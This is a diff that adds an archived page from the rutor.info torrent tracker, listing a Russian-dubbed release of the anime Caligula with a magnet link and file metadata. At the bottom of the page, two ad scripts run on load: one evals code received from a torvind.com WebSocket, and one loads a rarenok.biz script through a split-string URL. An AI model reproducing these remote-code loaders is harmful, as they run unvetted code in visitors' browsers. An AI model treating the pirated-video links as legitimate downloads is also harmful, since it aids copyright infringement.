@@ -1,0 +1,540 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Калигула / Caligula [01-05 из 12] (2018) HDTVRip 720p от Anilibria | L</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Калигула / Caligula [01-05 из 12] (2018) HDTVRip 720p от Anilibria | L</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:bff1c7eb5ac2379c5f2f7b89b40b718ec2f5a69d&amp;dn=rutor.info_%D0%9A%D0%B0%D0%BB%D0%B8%D0%B3%D1%83%D0%BB%D0%B0+%2F+Caligula+%5B01-05+%D0%B8%D0%B7+12%5D+%282018%29+HDTVRip+720p+%D0%BE%D1%82+Anilibria+%7C+L&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=627054"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/627054"><img src="http://s.rutor.info/t/down.png"> Скачать Caligula_-_AniLibriaHDTV-Rip_720p.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://img12.lostpic.net/2018/04/19/d16c2d3c8afd1df2ca13a5dae35cfdd3.jpg" /><br />
+<br />
+<u>Информация о фильме</u><br />
+<b>Название: </b>Калигула<br />
+<b>Оригинальное название: </b>Caligula <br />
+<b>Страна: </b>Япония <img src="http://img12.lostpic.net/2018/05/08/2b4dc5941298e52367fc6240fa2f3c3c.gif" /><br />
+<b>Год выхода: </b>2018<br />
+<b>Жанр: </b> <a href="/tag/10/Приключения" target="_blank">Приключения</a>, <a href="/tag/10/фантастика" target="_blank">фантастика</a><br />
+<b>Режиссер: </b>Дзюнъити Вада<br />
+<br />
+<br />
+<b>О фильме:</b> Виртуальный мир под названием Мёбиус кажется раем для всех страждущих. Попавшие туда забывают о своих страхах, печалях и тревогах, лишь услышав прекрасное пение Мю, обладающей сознанием программы. Также в этом раю люди забывают о существовании реального мира, да и обратный путь найти не так-то просто. Все, кто там находится, обретают облик подростков и вынуждены проживать школьные годы чудесные снова и снова. Ведь по мнению Мю, это самое счастливое время в жизни человека. Но нашлись несогласные с таким положением вещей. Они объединятся, чтобы найти путь домой, и для этого им предстоит противостоять главному монстру виртуального мира — самой Мю.<br />
+<br />
+<b>Студия:</b><img src="http://img12.lostpic.net/2018/05/08/78a063123ae8b67852bb062682384087.jpg" /><br />
+<br />
+<br />
+<b>Продолжительность: </b>~ 00:24:00<br />
+<b>Перевод: </b>Любительский (многоголосый)<br />
+<b>Озвучили:</b> Lupin &amp; Silv &amp; Itashi<br />
+<b>Сборка контейнера:</b> Eugeo<br />
+<br />
+<u>Файл</u><br />
+<b>Формат:</b> mkv<br />
+<b>Качество: </b>HDTVRip 720p<br />
+<b>Видео: </b>H.264; 1280x720; ~ 3000 Kbps, 23.976fps; (8 bit)<br />
+<b>Аудио 1</b>: AAC 48000 Hz, 2.0, 192 kbps Язык Русский<br />
+<b>Аудио 2</b>: AAC 48000 Hz, 2.0, 192 kbps Язык Японский <br />
+<b>Субтитры: </b>(внешние ASS) Язык субтитров русский ; Перевод: [YakuSub Studio]<br />
+<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Инфо-файл</div><div class="hidebody"></div><textarea class="hidearea"><br />
+Общее<br />
+Уникальный идентификатор                 : 218384528822389764303480449752281301665 (0xA44B54917D50B15783D79E132B02C2A1)<br />
+Полное имя                               : F:KinozalCaligula - AniLibria[HDTV-Rip 720p]Caligula_[01]_[AniLibria]_[HDTV-Rip_720p].mkv<br />
+Формат                                   : Matroska<br />
+Версия формата                           : Version 2<br />
+Размер файла                             : 632 Мбайт<br />
+Продолжительность                        : 24 м.<br />
+Общий поток                              : 3683 Кбит/сек<br />
+Дата кодирования                         : UTC 2018-04-10 06:47:44<br />
+Программа кодирования                    : mkvmerge v5.7.0 (&#039;The Whirlwind&#039;) built on Jul 29 2012 15:12:35<br />
+Библиотека кодирования                   : libebml v1.2.3 + libmatroska v1.3.0<br />
+<br />
+Видео<br />
+Идентификатор                            : 1<br />
+Формат                                   : AVC<br />
+Формат/Информация                        : Advanced Video Codec<br />
+Профиль формата                          : High@L4.1<br />
+Параметр CABAC формата                   : Да<br />
+Параметр ReFrames формата                : 4 кадра<br />
+Идентификатор кодека                     : V_MPEG4/ISO/AVC<br />
+Продолжительность                        : 24 м.<br />
+Ширина                                   : 1280 пикселей<br />
+Высота                                   : 720 пикселей<br />
+Соотношение сторон                       : 16:9<br />
+Режим частоты кадров                     : Постоянный<br />
+Частота кадров                           : 23,976 кадра/сек<br />
+Цветовое пространство                    : YUV<br />
+Субдискретизация насыщенности            : 4:2:0<br />
+Битовая глубина                          : 8 бит<br />
+Тип развёртки                            : Прогрессивная<br />
+Библиотека кодирования                   : x264 core 129 r2245+729M 1a52e03<br />
+Настройки программы                      : cabac=1 / ref=4 / deblock=1:1:-1 / analyse=0x3:0x113 / me=umh / subme=9 / psy=1 / fade_compensate=0.00 / psy_rd=1.00:0.00 / mixed_ref=1 / me_range=24 / chroma_me=1 / trellis=2 / 8x8dct=1 / cqm=0 / deadzone=21,11 / fast_pskip=1 / chroma_qp_offset=-2 / threads=8 / lookahead_threads=1 / sliced_threads=0 / nr=0 / decimate=1 / interlaced=0 / bluray_compat=0 / constrained_intra=0 / fgo=0 / bframes=9 / b_pyramid=2 / b_adapt=2 / b_bias=0 / direct=1 / weightb=1 / open_gop=0 / weightp=2 / keyint=240 / keyint_min=24 / scenecut=40 / intra_refresh=0 / rc=crf / mbtree=0 / crf=17.5 / qcomp=0.72 / qpmin=0 / qpmax=69 / qpstep=4 / ip_ratio=1.40 / pb_ratio=1.30 / aq=1:0.85<br />
+Default                                  : Да<br />
+Forced                                   : Нет<br />
+Цветовой диапазон                        : Limited<br />
+Основные цвета                           : BT.709<br />
+Характеристики трансфера                 : BT.709<br />
+Коэффициенты матрицы                     : BT.709<br />
+<br />
+Аудио #1<br />
+Идентификатор                            : 2<br />
+Формат                                   : AAC<br />
+Формат/Информация                        : Advanced Audio Codec<br />
+Профиль формата                          : LC<br />
+Идентификатор кодека                     : A_AAC<br />
+Продолжительность                        : 24 м.<br />
+Каналы                                   : 2 канала<br />
+Расположение каналов                     : Front: L R<br />
+Частота                                  : 48,0 КГц<br />
+Метод сжатия                             : С потерями<br />
+Заголовок                                : Lupin Silv Itashi<br />
+Язык                                     : Russian<br />
+Default                                  : Да<br />
+Forced                                   : Да<br />
+<br />
+Аудио #2<br />
+Идентификатор                            : 3<br />
+Формат                                   : AAC<br />
+Формат/Информация                        : Advanced Audio Codec<br />
+Профиль формата                          : LC<br />
+Идентификатор кодека                     : A_AAC<br />
+Продолжительность                        : 24 м.<br />
+Каналы                                   : 2 канала<br />
+Расположение каналов                     : Front: L R<br />
+Частота                                  : 48,0 КГц<br />
+Метод сжатия                             : С потерями<br />
+Язык                                     : Japanese<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Текст #1<br />
+Идентификатор                            : 4<br />
+Формат                                   : ASS<br />
+Идентификатор кодека                     : S_TEXT/ASS<br />
+Идентификатор кодека/Информация          : Advanced Sub Station Alpha<br />
+Метод сжатия                             : Без потерь<br />
+Заголовок                                : [YakuSub Studio]<br />
+Язык                                     : Russian<br />
+Default                                  : Да<br />
+Forced                                   : Нет<br />
+<br />
+Текст #2<br />
+Идентификатор                            : 5<br />
+Формат                                   : ASS<br />
+Идентификатор кодека                     : S_TEXT/ASS<br />
+Идентификатор кодека/Информация          : Advanced Sub Station Alpha<br />
+Метод сжатия                             : Без потерь<br />
+Заголовок                                : Надписи<br />
+Язык                                     : Russian<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Общее<br />
+Уникальный идентификатор                 : 198535819975682369601254107533635189144 (0x955C9BAAA312920C9074F125BD777998)<br />
+Полное имя                               : F:KinozalCaligula - AniLibria[HDTV-Rip 720p]Caligula_[02]_[AniLibria]_[HDTV-Rip_720p].mkv<br />
+Формат                                   : Matroska<br />
+Версия формата                           : Version 2<br />
+Размер файла                             : 583 Мбайт<br />
+Продолжительность                        : 24 м.<br />
+Общий поток                              : 3396 Кбит/сек<br />
+Дата кодирования                         : UTC 2018-04-17 17:41:27<br />
+Программа кодирования                    : mkvmerge v5.7.0 (&#039;The Whirlwind&#039;) built on Jul 29 2012 15:12:35<br />
+Библиотека кодирования                   : libebml v1.2.3 + libmatroska v1.3.0<br />
+<br />
+Видео<br />
+Идентификатор                            : 1<br />
+Формат                                   : AVC<br />
+Формат/Информация                        : Advanced Video Codec<br />
+Профиль формата                          : High@L4.1<br />
+Параметр CABAC формата                   : Да<br />
+Параметр ReFrames формата                : 4 кадра<br />
+Идентификатор кодека                     : V_MPEG4/ISO/AVC<br />
+Продолжительность                        : 24 м.<br />
+Ширина                                   : 1280 пикселей<br />
+Высота                                   : 720 пикселей<br />
+Соотношение сторон                       : 16:9<br />
+Режим частоты кадров                     : Постоянный<br />
+Частота кадров                           : 23,976 кадра/сек<br />
+Цветовое пространство                    : YUV<br />
+Субдискретизация насыщенности            : 4:2:0<br />
+Битовая глубина                          : 8 бит<br />
+Тип развёртки                            : Прогрессивная<br />
+Библиотека кодирования                   : x264 core 129 r2245+729M 1a52e03<br />
+Настройки программы                      : cabac=1 / ref=4 / deblock=1:1:-1 / analyse=0x3:0x113 / me=umh / subme=9 / psy=1 / fade_compensate=0.00 / psy_rd=1.00:0.00 / mixed_ref=1 / me_range=24 / chroma_me=1 / trellis=2 / 8x8dct=1 / cqm=0 / deadzone=21,11 / fast_pskip=1 / chroma_qp_offset=-2 / threads=8 / lookahead_threads=1 / sliced_threads=0 / nr=0 / decimate=1 / interlaced=0 / bluray_compat=0 / constrained_intra=0 / fgo=0 / bframes=9 / b_pyramid=2 / b_adapt=2 / b_bias=0 / direct=1 / weightb=1 / open_gop=0 / weightp=2 / keyint=240 / keyint_min=24 / scenecut=40 / intra_refresh=0 / rc=crf / mbtree=0 / crf=17.5 / qcomp=0.72 / qpmin=0 / qpmax=69 / qpstep=4 / ip_ratio=1.40 / pb_ratio=1.30 / aq=1:0.85<br />
+Default                                  : Да<br />
+Forced                                   : Нет<br />
+Цветовой диапазон                        : Limited<br />
+Основные цвета                           : BT.709<br />
+Характеристики трансфера                 : BT.709<br />
+Коэффициенты матрицы                     : BT.709<br />
+<br />
+Аудио #1<br />
+Идентификатор                            : 2<br />
+Формат                                   : AAC<br />
+Формат/Информация                        : Advanced Audio Codec<br />
+Профиль формата                          : LC<br />
+Идентификатор кодека                     : A_AAC<br />
+Продолжительность                        : 24 м.<br />
+Каналы                                   : 2 канала<br />
+Расположение каналов                     : Front: L R<br />
+Частота                                  : 48,0 КГц<br />
+Метод сжатия                             : С потерями<br />
+Заголовок                                : Lupin &amp; Silv &amp; Itashi<br />
+Язык                                     : Russian<br />
+Default                                  : Да<br />
+Forced                                   : Да<br />
+<br />
+Аудио #2<br />
+Идентификатор                            : 3<br />
+Формат                                   : AAC<br />
+Формат/Информация                        : Advanced Audio Codec<br />
+Профиль формата                          : LC<br />
+Идентификатор кодека                     : A_AAC<br />
+Продолжительность                        : 24 м.<br />
+Каналы                                   : 2 канала<br />
+Расположение каналов                     : Front: L R<br />
+Частота                                  : 48,0 КГц<br />
+Метод сжатия                             : С потерями<br />
+Язык                                     : Japanese<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Текст<br />
+Идентификатор                            : 4<br />
+Формат                                   : ASS<br />
+Идентификатор кодека                     : S_TEXT/ASS<br />
+Идентификатор кодека/Информация          : Advanced Sub Station Alpha<br />
+Метод сжатия                             : Без потерь<br />
+Заголовок                                : [YakuSub Studio]<br />
+Язык                                     : Russian<br />
+Default                                  : Да<br />
+Forced                                   : Нет<br />
+</textarea></div><br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Список серий</div><div class="hidebody"></div><textarea class="hidearea"><br />
+01. Утратив самообладание, ты не можешь осознать истину реальности.<br />
+02. Тревога, гнев и другие негативные эмоции, распыляемые на других.<br />
+</textarea></div><br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><br />
+<a href="https://b.radikal.ru/b09/1804/ee/bc16c0656556.png" target="_blank"><img src="https://b.radikal.ru/b09/1804/ee/bc16c0656556t.jpg" /></a><a href="https://b.radikal.ru/b35/1804/74/8f27ea8c2d00.png" target="_blank"> <img src="https://b.radikal.ru/b35/1804/74/8f27ea8c2d00t.jpg" /></a><a href="https://c.radikal.ru/c30/1804/d5/b6d317640995.png" target="_blank"> <img src="https://c.radikal.ru/c30/1804/d5/b6d317640995t.jpg" /></a><br />
+<br />
+ <br />
+</textarea></div><br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Раздача ведется путем добавления новых серий</div><div class="hidebody"></div><textarea class="hidearea">Когда раздача ведётся путём добавления новых серий, при каждом добавлении создётся новый торрент. Чтобы начать докачку новой серии, пользователям необходимо сделать следующее:<br />
+(1) остановить скачивание,<br />
+(2) удалить старый торрент у себя из клиента (старые серии удалять не надо),<br />
+(3) скачать новый торрент и запустить его у себя в клиенте вместо старого, при этом указать клиенту путь в старую папку, куда и должно происходить скачивание новых серий.<br />
+Ваш клиент при этом должен произвести хеширование (проверку) старой папки (если не производит сам - помогите ему сделать это), и будет докачивать только те серии, которых у вас ещё нет. Старые серии при этом не удаляются, а продолжают раздаваться!<br />
+Eсли вы уже удалили старые серии, то предотвратить повторную закачку старых серий можно, отжав галочку в соответсвующих местах при запуске нового торрента. По возможности, желательно не удалять старые серии как можно дольше, чтобы релизер не столько продолжал раздавать старые серии, а смог сконцентрироваться на новых.<br />
+</textarea></div></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1138845/0" target="_blank">Eugeo</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>10 из 10 (1 голосов, самая низкая оценка - 10, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/anime" target="_blank">Аниме </a></td></tr>
+<tr><td class="header">Раздают</td><td>2</td></tr>
+<tr><td class="header">Качают</td><td>1</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 7:19:05 (36 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 19:51:11  (12 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>2.40&nbsp;GB  (2571978962 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 627054);">закладки</span></td>
+</tr>
+
+
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/627054.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (5)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=627054">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(627054);">Промодерировать раздачу</span> | <span onclick="confirm_delete(627054);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/627054">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>Eugeo</b></td> <td>08-05-2018 19:33:58 (12 часа назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3199492"></span><script type="text/javascript">cOptions(1138845,3199492);</script></td></tr><tr><td class="c_t" colspan=4>Добавлена 5 серия</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
